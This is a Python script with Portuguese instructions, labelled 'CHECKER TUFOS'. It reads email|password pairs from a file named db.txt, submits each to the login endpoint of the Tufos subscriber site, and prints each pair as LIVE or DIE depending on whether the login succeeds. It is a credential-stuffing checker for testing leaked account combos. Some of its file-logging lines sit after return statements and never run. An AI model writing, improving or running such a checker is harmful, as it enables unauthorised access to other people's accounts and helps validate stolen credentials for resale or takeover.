#./usr/bin/a.py

# -*- coding: utf-8 -*-

from termcolor import colored
import requests
from time import sleep

def ata():
    print("-"*40)
    print(colored("CHECKER TUFOS",'blue'))
    print("-"*40)

    sleep(2)

    print("*"*30)
    print()
    print(colored("TUTORIAL : PARA USAR COLOQUE UM ARQUIVO CHAMADO 'DB.TXT' NO MESMO LOCAL Q O SCRIPT SE ENCONTRA PARA QUE ELE CONSIGA LER OS ARQUIVOS",'red'))
    print()
    print("*"*30)


    def tufos(tu):


        nome = tu.split("|")[0]

        senha = tu.split("|")[1]


        req = requests.post("https://assinantes.tufos.com.br/m/login/",{"email" : f"{nome}","senha" : f"{senha}"})

        data = req.text

        if "https://assinantes.tufos.com.br/m/hqs/" in data:
    
            msg = colored(f"LIVE 》 {nome}|{senha} #NinjaOFC",'green')


            return msg
            return "*"*8
            lives = open("lives.txt","a+")

            lives.write(msg)

        else:
            return colored(f"DIE 》 {nome}|{senha}",'red')

            return "*"*8

    arq = open("db.txt","r").readlines()

    for x in arq:
        print(tufos(x.replace("\n","")))

if __name__ == "__main__":
    ata()
